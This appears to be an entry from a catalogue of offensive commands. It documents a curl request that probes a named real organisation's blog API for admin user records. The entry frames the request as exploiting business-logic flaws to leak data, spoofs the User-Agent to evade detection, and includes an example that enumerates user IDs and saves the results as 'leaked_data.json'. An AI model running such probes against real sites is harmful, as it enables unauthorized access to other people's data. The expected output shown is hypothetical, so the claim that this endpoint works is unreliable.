---
id: cmd-curl-leak-001
data: >-
  curl -X GET "https://blog.makerdao.com/api/users?role=admin" -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web
  - recon
  - info-leak
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.336Z'
verified: false
validated: true
submitted: true
---
# curl-info-leak-test

## Command

```bash
curl -X GET "https://blog.makerdao.com/api/users?role=admin" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This curl command tests for business logic flaws by requesting admin user data from the MakerDAO blog API, potentially leaking sensitive information if access controls are inadequate. Use it to probe web endpoints for unauthorized disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `"https://blog.makerdao.com/api/users?role=admin"` | Target URL with manipulated parameter for admin role | Yes |
| `-H "User-Agent: ..."` | Mimics a browser to evade basic detection | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://blog.makerdao.com/api/users?role=admin"
```

### Advanced Usage

```bash
curl -X GET "https://blog.makerdao.com/api/users?id=1..10" -H "User-Agent: Mozilla/5.0" -o leaked_data.json
```

## Expected Output

A JSON response like {"users": [{"id":1, "email":"admin@makerdao.com", "role":"admin"}]}, indicating successful leakage if sensitive fields are returned.

## Related

- [[Related Procedure|procedures/Exploit-Business-Logic-Flaws-for-Info-Leakage]]
